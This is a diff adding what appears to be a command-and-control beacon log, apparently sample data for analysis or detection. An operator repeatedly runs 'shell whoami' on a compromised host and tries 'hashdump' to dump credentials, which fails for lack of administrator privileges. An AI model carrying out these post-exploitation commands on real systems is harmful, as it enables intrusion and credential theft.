@@ -1,0 +1,45 @@
+11/18 23:59:51 UTC [checkin] host called home, sent: 48 bytes
+11/19 00:12:50 UTC [input] <admin1> 
+11/19 00:12:50 UTC [error] Unknown command: 
+11/19 00:13:38 UTC [input] <admin1> shell whoami
+11/19 00:13:38 UTC [task] <T1059> Tasked beacon to run: whoami
+11/19 00:13:39 UTC [checkin] host called home, sent: 37 bytes
+11/19 00:13:40 UTC [output]
+received output:
+not-found-404\kaeiy
+
+
+11/19 00:14:00 UTC [input] <admin1> shell whoami
+11/19 00:14:01 UTC [task] <T1059> Tasked beacon to run: whoami
+11/19 00:14:01 UTC [checkin] host called home, sent: 37 bytes
+11/19 00:14:03 UTC [output]
+received output:
+not-found-404\kaeiy
+
+
+11/19 00:18:19 UTC [input] <admin1> shell whoami
+11/19 00:18:19 UTC [task] <T1059> Tasked beacon to run: whoami
+11/19 00:18:19 UTC [checkin] host called home, sent: 37 bytes
+11/19 00:18:32 UTC [output]
+received output:
+not-found-404\kaeiy
+
+
+11/19 00:24:44 UTC [input] <admin1> shell whoami
+11/19 00:24:44 UTC [task] <T1059> Tasked beacon to run: whoami
+11/19 00:24:44 UTC [checkin] host called home, sent: 37 bytes
+11/19 00:24:45 UTC [output]
+received output:
+not-found-404\kaeiy
+
+
+11/19 00:25:39 UTC [input] <admin1> hashdump
+11/19 00:25:39 UTC [error] hashdump error: this command requires administrator privileges
+11/19 00:26:12 UTC [input] <admin1> shell whoami
+11/19 00:26:12 UTC [task] <T1059> Tasked beacon to run: whoami
+11/19 00:26:12 UTC [checkin] host called home, sent: 37 bytes
+11/19 00:26:13 UTC [output]
+received output:
+not-found-404\kaeiy
+
+
